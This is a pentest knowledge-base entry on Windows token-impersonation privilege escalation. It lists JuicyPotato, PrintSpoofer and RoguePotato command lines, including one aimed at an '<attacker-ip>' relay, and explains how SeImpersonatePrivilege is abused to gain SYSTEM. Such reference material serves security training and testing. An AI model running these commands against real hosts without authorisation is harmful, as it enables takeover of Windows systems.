---
id: priv-010
title: "Token Impersonation"
category: privilege_escalation
tags: [token-impersonation, seimpersonateprivilege, juicy-potato, windows-privesc, rotten-potato]
platform: [windows]
commands:
  - "whoami /priv"
  - "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami > C:\\output.txt\" -t *"
  - "PrintSpoofer.exe -i -c cmd"
  - ".\RoguePotato.exe -r <attacker-ip> -e \"cmd.exe /c whoami\""
references:
  - "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato"
  - "https://github.com/itm4n/PrintSpoofer"
---

Token impersonation abuses the `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` rights, which are granted by default to service accounts (IIS, MSSQL, etc.), to impersonate a SYSTEM-level token and escalate privileges. Tools like JuicyPotato, RoguePotato, and PrintSpoofer exploit COM server and Windows print spooler interactions to coerce SYSTEM to authenticate to an attacker-controlled listener, capturing and impersonating the resulting token. The presence of these privileges is confirmed with `whoami /priv`, and the appropriate tool is selected based on the Windows version since different techniques are required for Server 2019 and later due to DCOM hardening.
